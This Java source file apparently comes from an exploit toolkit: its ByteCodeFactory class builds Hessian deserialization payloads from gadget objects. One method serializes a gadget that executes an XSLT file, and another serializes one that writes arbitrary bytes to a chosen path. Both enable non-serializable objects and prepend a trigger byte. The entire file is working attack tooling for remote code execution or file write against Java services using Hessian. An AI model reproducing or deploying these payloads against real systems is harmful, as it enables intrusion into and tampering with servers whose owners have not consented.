package util;

import com.caucho.hessian.io.Hessian2Output;
import com.caucho.hessian.io.HessianOutput;

import java.io.ByteArrayOutputStream;
import java.io.IOException;

public class ByteCodeFactory {
    public static byte[] generateXSLTHessianSerializePayload(String xsltPath, int hessianVersion){
        try {
            Object pkcs9Attributes = GadgetFactory.createXSLTSerializeObject(xsltPath);
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            if (hessianVersion == 1){
                HessianOutput out = new HessianOutput(bos);
                bos.write(67);
                out.getSerializerFactory().setAllowNonSerializable(true);
                out.writeObject(pkcs9Attributes);
                out.flush();
                out.close();
                bos.close();
            } else if (hessianVersion == 2) {
                Hessian2Output out = new Hessian2Output(bos);
                bos.write(67);
                out.getSerializerFactory().setAllowNonSerializable(true);
                out.writeObject(pkcs9Attributes);
                out.flush();
                out.close();
                bos.close();
            } else {
                return null;
            }
            return bos.toByteArray();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    public static byte[] generateWriteXSLTPayload(String path, byte[] data, int hessianVersion){
        try {
            Object pkcs9Attributes = GadgetFactory.createXSLTWriteFileObject(path,data);
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            if (hessianVersion == 1){
                HessianOutput out = new HessianOutput(bos);
                bos.write(67);
                out.getSerializerFactory().setAllowNonSerializable(true);
                out.writeObject(pkcs9Attributes);
                out.flush();
                out.close();
                bos.close();
            } else if (hessianVersion == 2) {
                Hessian2Output out = new Hessian2Output(bos);
                bos.write(67);
                out.getSerializerFactory().setAllowNonSerializable(true);
                out.writeObject(pkcs9Attributes);
                out.flush();
                out.close();
                bos.close();
            } else {
                return null;
            }
            return bos.toByteArray();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
